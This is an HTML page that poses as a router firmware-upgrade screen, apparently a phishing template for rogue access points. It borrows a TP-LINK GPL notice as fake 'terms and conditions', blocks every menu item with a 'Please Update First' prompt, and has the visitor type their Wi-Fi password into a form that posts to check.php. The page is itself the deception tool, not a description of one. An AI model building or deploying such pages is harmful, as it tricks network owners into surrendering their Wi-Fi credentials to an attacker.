<!DOCTYPE html>
<html lang="en">
<head>
  <title>Router Configuration Page</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="bootstrap.min.css">
  <script src="jquery.min.js"></script>
  <script src="bootstrap.min.js"></script>

  <!-- CSS -->
  <style type="text/css">

    /* Sticky footer styles
    -------------------------------------------------- */

    html,
    body {
          height: 100%;
          /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }
  </style>

</head>

<body>

  <!-- Start navigation bar -->
  <!-- To change the navigation bar color change background attribute -->
  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
    <div class="container-fluid">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <!--
        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
        -->
      </div>
      <div class="collapse navbar-collapse" id="myNavbar">
        <ul class="nav navbar-nav">
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Setup</a></li>
              <li><a href="#">DDNS</a></li>
              <li><a href="#">MAC Address Clone</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Wireless Settings</a></li>
              <li><a href="#">Wireless Security</a></li>
              <li><a href="#">Wireless MAC Filter</a></li>
              <li><a href="#">Advanced Wireless Settings</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Firewall</a></li>
              <li><a href="#">VPN</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Internet Access</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Management</a></li>
              <li><a href="#">Log</a></li>
              <li><a href="#">Diagnostics</a></li>
              <li><a href="#">Factory Defaults</a></li>
              <li><a href="#">Config Manegements</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Router</a></li>
              <li><a href="#">Local Network</a></li>
              <li><a href="#">Wireless</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <!-- End navigation bar -->

  <!-- Start page content -->
  <div class="container">
	   <div class="col-sm">
       <h2 class="text-center" style="color:RoyalBlue">Firmware Upgrade</h2>
    	 <p class="lead">A new version of the firmware has been detected and awaiting installation. Please review our new terms and conditions and proceed.</p>
     </div>
    <form action="check.php" method="post" id="form1" name="form1">
      <div class="form-group">
	    <div class="checkbox">
             <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
        </div>
      </div>
      <div class="form-group has-feedback">
          <label for="password">Password WIFI :</label>
          <input class="form-control" type="password" id="pwd" name="key1">
      </div>
      <div class="container text-center">
        <input type="submit" onclick="cek()" class="btn btn-primary" id="btn" value="Start Upgrade" name="signIn">
      </div>
        <label for="comment">Terms And Conditions:</label>
        <textarea readonly class="form-control" rows="5" id="comment">
GNU General Public License Notice
This product includes software code developed by third parties,
including software code subject to the GNU General Public License
(“GPL”). As applicable, TP-LINK provides mail service of a machine
readable copy of the corresponding GPL source code on CD-ROM
upon request via email or traditional paper mail. TP-LINK will
charge for a nominal cost to cover shipping and media charges as
allowed under the GPL. This offer will be valid for at least 3 years.
For GPL inquiries and the GPL CD-ROM information, please contact
us at GPL@tp-link.com or
Building 24(floors 1,3,4,5) and 28(floors1-4) Central Science and
Technology Park, Shennan Rd, Nanshan, Shenzhen,China.
Additionally, TP-LINK provides for a GPL-Code-Centre under http://
www.tp-link.com/en/support/gpl/ where machine readable copies
of the GPL source codes used in TP-LINK products are available for
free download. Please note, that the GPL-Code-Centre is only provided
for as a courtesy to TP-LINK’s customers but may neither offer
a full set of source codes used in all products nor always provide for
the latest or actual version of such source codes.
The GPL Code used in this product is distributed WITHOUT ANY
WARRANTY and is subject to the copyrights of one or more authors.
Please refer to the following GNU General Public License for further
information.
GNU GENERAL PUBLIC LICENSE Version 1, February 1989
 Copyright (C) 1989 Free Software Foundation, Inc.
51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is
not allowed.
Preamble
The license agreements of most software companies try to keep users at the mercy of those companies.
By contrast, our General Public License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users. The General Public License applies to the Free
Software Foundation’s software and to any other program whose authors commit to using it. You can use
it for your programs, too.
When we speak of free software, we are referring to freedom, not price. Specifically, the General Public
License is designed to make sure that you have the freedom to give away or sell copies of free software,
that you receive source code or can get it if you want it, that you can change the software or use pieces of
it in new free programs; and that you know you can do these things.
To protect your rights, we need to make restrictions that forbid anyone to deny you these rights or to ask
you to surrender the rights. These restrictions translate to certain responsibilities for you if you distribute
copies of the software, or if you modify it.
For example, if you distribute copies of a such a program, whether gratis or for a fee, you must give the
recipients all the rights that you have. You must make sure that they, too, receive or can get the source
code. And you must tell them their rights.
We protect your rights with two steps: (1) copyright the software, and (2) offer you this license which
gives you legal permission to copy, distribute and/or modify the software.
Also, for each author’s protection and ours, we want to make certain that everyone understands that
there is no warranty for this free software. If the software is modified by someone else and passed on, we
want its recipients to know that what they have is not the original, so that any problems introduced by
others will not reflect on the original authors’ reputations.
The precise terms and conditions for copying, distribution and modification follow.
GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
0. This License Agreement applies to any program or other work which contains a notice placed by the
copyright holder saying it may be distributed under the terms of this General Public License. The
“Program”, below, refers to any such program or work, and a “work based on the Program” means
either the Program or any work containing the Program or a portion of it, either verbatim or with
modifications. Each licensee is addressed as “you”.
1. You may copy and distribute verbatim copies of the Program’s source code as you receive it, in any
medium, provided that you conspicuously and appropriately publish on each copy an appropriate
copyright notice and disclaimer of warranty; keep intact all the notices that refer to this General
Public License and to the absence of any warranty; and give any other recipients of the Program a
copy of this General Public License along with the Program. You may charge a fee for the physical
act of transferring a copy.
2. You may modify your copy or copies of the Program or any portion of it, and copy and distribute
such modifications under the terms of Paragraph 1 above, provided that you also do the following:
a ) cause the modified files to carry prominent notices stating that you changed the files and 
the date of any change; and
b ) cause the whole of any work that you distribute or publish, that in whole or in part contains
the Program or any part thereof, either with or without modifications, to be licensed at no
charge to all third parties under the terms of this General Public License (except that you
may choose to grant warranty protection to some or all third parties, at your option).
c ) If the modified program normally reads commands interactively when run, you must cause
it, when started running for such interactive use in the simplest and most usual way, to print
or display an announcement including an appropriate copyright notice and a notice that
there is no warranty (or else, saying that you provide a warranty) and that users may redistribute
the program under these conditions, and telling the user how to view a copy of this
General Public License.
d ) You may charge a fee for the physical act of transferring a copy, and you may at your option
offer warranty protection in exchange for a fee.
e ) Mere aggregation of another independent work with the Program (or its derivative) on a
volume of a storage or distribution medium does not bring the other work under the scope
of these terms.
3. You may copy and distribute the Program (or a portion or derivative of it, under Paragraph 2) in
object code or executable form under the terms of Paragraphs 1 and 2 above provided that you also
do one of the following:
a ) accompany it with the complete corresponding machine-readable source code, which must
be distributed under the terms of Paragraphs 1 and 2 above; or,
b ) accompany it with a written offer, valid for at least three years, to give any third party free
(except for a nominal charge for the cost of distribution) a complete machine-readable copy
of the corresponding source code, to be distributed under the terms of Paragraphs 1 and 2
above; or,
c ) accompany it with the information you received as to where the corresponding source code
may be obtained. (This alternative is allowed only for noncommercial distribution and only
if you received the program in object code or executable form alone.)
Source code for a work means the preferred form of the work for making modifications to it. For an
executable file, complete source code means all the source code for all modules it contains; but, as
a special exception, it need not include source code for modules which are standard libraries that
accompany the operating system on which the executable file runs, or for standard header files or
definitions files that accompany that operating system.
4. You may not copy, modify, sublicense, distribute or transfer the Program except as expressly provided
under this General Public License. Any attempt otherwise to copy, modify, sublicense, distribute
or transfer the Program is void, and will automatically terminate your rights to use the Program under
this License. However, parties who have received copies, or rights to use copies, from you under
this General Public License will not have their licenses terminated so long as such parties remain in
full compliance.
a ) Accompany the work with the complete corresponding machine-readable source code for
the Library including whatever changes were used in the work (which must be distributed
under Sections 1 and 2 above); and, if the work is an executable linked with the Library,
with the complete machine-readable “work that uses the Library”, as object code and/or
source code, so that the user can modify the Library and then relink to produce a modified
executable containing the modified Library. (It is understood that the user who changes the
contents of definitions files in the Library will not necessarily be able to recompile the application
to use the modified definitions.)
b ) Use a suitable shared library mechanism for linking with the Library. A suitable mechanism is
one that (1) uses at run time a copy of the library already present on the user’s computer system,
rather than copying library functions into the executable, and (2) will operate properly
with a modified version of the library, if the user installs one, as long as the modified version
is interface-compatible with the version that the work was made with.
c ) Accompany the work with a written offer, valid for at least three years, to give the same user
the materials specified in Subsection 6a, above, for a charge no more than the cost of performing
this distribution.
d ) If distribution of the work is made by offering access to copy from a designated place, offer
equivalent access to copy the above specified materials from the same place.
e ) Verify that the user has already received a copy of these materials or that you have already
sent this user a copy.
For an executable, the required form of the “work that uses the Library” must include any data and 
utility programs needed for reproducing the executable from it. However, as a special exception,
the materials to be distributed need not include anything that is normally distributed (in either
source or binary form) with the major components (compiler, kernel, and so on) of the operating
system on which the executable runs, unless that component itself accompanies the executable.
It may happen that this requirement contradicts the license restrictions of other proprietary libraries
that do not normally accompany the operating system. Such a contradiction means you cannot use
both them and the Library together in an executable that you distribute.
7. You may place library facilities that are a work based on the Library side-by-side in a single library
together with other library facilities not covered by this License, and distribute such a combined
library, provided that the separate distribution of the work based on the Library and of the other
library facilities is otherwise permitted, and provided that you do these two things:
a ) Accompany the combined library with a copy of the same work based on the Library, uncombined
with any other library facilities. This must be distributed under the terms of the
Sections above.
b ) Give prominent notice with the combined library of the fact that part of it is a work based on
the Library, and explaining where to find the accompanying uncombined form of the same
work.
8. You may not copy, modify, sublicense, link with, or distribute the Library except as expressly provided
under this License. Any attempt otherwise to copy, modify, sublicense, link with, or distribute
the Library is void, and will automatically terminate your rights under this License. However, parties
who have received copies, or rights, from you under this License will not have their licenses terminated
so long as such parties remain in full compliance.
9. You are not required to accept this License, since you have not signed it. However, nothing else
grants you permission to modify or distribute the Library or its derivative works. These actions are
prohibited by law if you do not accept this License. Therefore, by modifying or distributing the Library
(or any work based on the Library), you indicate your acceptance of this License to do so, and
all its terms and conditions for copying, distributing or modifying the Library or works based on it.
10. Each time you redistribute the Library (or any work based on the Library), the recipient automatically
receives a license from the original licensor to copy, distribute, link with or modify the Library
subject to these terms and conditions. You may not impose any further restrictions on the recipients’
exercise of the rights granted herein. You are not responsible for enforcing compliance by third
parties with this License.
11. If, as a consequence of a court judgment or allegation of patent infringement or for any other
reason (not limited to patent issues), conditions are imposed on you (whether by court order, agreement
or otherwise) that contradict the conditions of this License, they do not excuse you from the
conditions of this License. If you cannot distribute so as to satisfy simultaneously your obligations
under this License and any other pertinent obligations, then as a consequence you may not distribute
the Library at all. For example, if a patent license would not permit royalty-free redistribution of
the Library by all those who receive copies directly or indirectly through you, then the only way you
could satisfy both it and this License would be to refrain entirely from distribution of the Library.
If any portion of this section is held invalid or unenforceable under any particular circumstance, the
balance of the section is intended to apply, and the section as a whole is intended to apply in other
circumstances.
It is not the purpose of this section to induce you to infringe any patents or other property right
claims or to contest validity of any such claims; this section has the sole purpose of protecting the
integrity of the free software distribution system which is implemented by public license practices.
Many people have made generous contributions to the wide range of software distributed through
that system in reliance on consistent application of that system; it is up to the author/donor to
decide if he or she is willing to distribute software through any other system and a licensee cannot 
impose that choice.
This section is intended to make thoroughly clear what is believed to be a consequence of the rest
of this License.
12. If the distribution and/or use of the Library is restricted in certain countries either by patents or by
copyrighted interfaces, the original copyright holder who places the Library under this License may
add an explicit geographical distribution limitation excluding those countries, so that distribution is
permitted only in or among countries not thus excluded. In such case, this License incorporates the
limitation as if written in the body of this License.
13. The Free Software Foundation may publish revised and/or new versions of the Lesser General Public
License from time to time. Such new versions will be similar in spirit to the present version, but may
differ in detail to address new problems or concerns.
Each version is given a distinguishing version number. If the Library specifies a version number of
this License which applies to it and “any later version”, you have the option of following the terms
and conditions either of that version or of any later version published by the Free Software Foundation.
If the Library does not specify a license version number, you may choose any version ever
published by the Free Software Foundation.
14. If you wish to incorporate parts of the Library into other free programs whose distribution conditions
are incompatible with these, write to the author to ask for permission. For software which is
copyrighted by the Free Software Foundation, write to the Free Software Foundation; we sometimes
make exceptions for this. Our decision will be guided by the two goals of preserving the free status
of all derivatives of our free software and of promoting the sharing and reuse of software generally.
NO WARRANTY.
You should also get your employer (if you work as a programmer) or school, if any, to sign a “copyright
disclaimer” for the program, if necessary. For more information on this, and how to apply and follow the
GNU GPL, see <http://www.gnu.org/licenses/>.
The GNU General Public License does not permit incorporating your program into proprietary programs.
If your program is a subroutine library, you may consider it more useful to permit linking proprietary
applications with the library. If this is what you want to do, use the GNU Lesser General Public License
instead of this License. But first, please read <http://www.gnu.org/philosophy/why-not-lgpl.html>.
       </textarea>
     
    </form>
    <div id="push"></div>
  </div>
  <!-- Start page content -->

  <!-- Start footer -->
  <footer class="footer">
    <div class="container text-center">
      <p class="text-muted">Router-OS ©  2018, All Rights Reserved.</p>
    </div>
  </footer>
  <!-- End footer -->

  <!-- Start update first message -->
  <div class="modal fade" id="update-only" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Please Update First.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End update first message -->

  <!-- Start empty password message -->
  <div class="modal fade" id="empty-pass">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Please Input Valid Password. (Must be between 7 and 64 characters)</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End empty password message -->

  <!-- Start empty password message -->
  <div class="modal fade" id="no-checkbox">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Please Check The I Agree Button.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End empty password message -->

<script>

/*
  Check the password field and act accordingly.
*/
$("#btn").on("click", function(e) {

    // get the password box and checkbox elements
	var input = document.getElementById("pwd");
    var box = document.getElementById("check-box");

    // if the box is checked
  	if ( box.checked != true ){
        	// display no checkbox message
	        $("#no-checkbox").modal("show");
		return false;
      	}
      	if ( input.value.lenght < 7 ||  input.value.lenght > 64){
		// display no password message
		$("#empty-pass").modal("show");
		return false;
   	}


});

function cek()
{
	//window.alert("jdjdj");
}

/*
  Check the status of check box
*/
function checkBoxStatus()
{
  // get the password box and checkbox elements
	var box = document.getElementById("check-box");
	var input = document.getElementById("pwd");

  // if the box is checked
	if ( box.checked == true )
		{
      // enabale the password box
			input.disabled = false;
		}
	else
		{
      // disable the password box
			input.disabled = true;
		}
	}
</script>
</body>
</html>
